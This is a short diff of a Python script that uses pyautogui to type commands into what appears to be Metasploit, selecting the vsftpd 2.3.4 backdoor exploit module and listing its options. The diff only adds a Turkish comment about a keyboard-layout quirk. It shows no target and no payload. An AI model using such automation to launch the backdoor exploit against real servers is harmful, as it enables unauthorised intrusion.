@@ -14,7 +14,7 @@ def worker():
         time.sleep(3)
 
         pyautogui.write("use exploit{unix{ftp{vsftpd_234_backdoor", interval=0.05)
-        pyautogui.press('enter')
+        pyautogui.press('enter')  # Modul secerken "{" karakteri yerine "/" karakteri yazilmaktadir.
         time.sleep(1)
         pyautogui.write('show options', interval=0.05)
         pyautogui.press('enter')
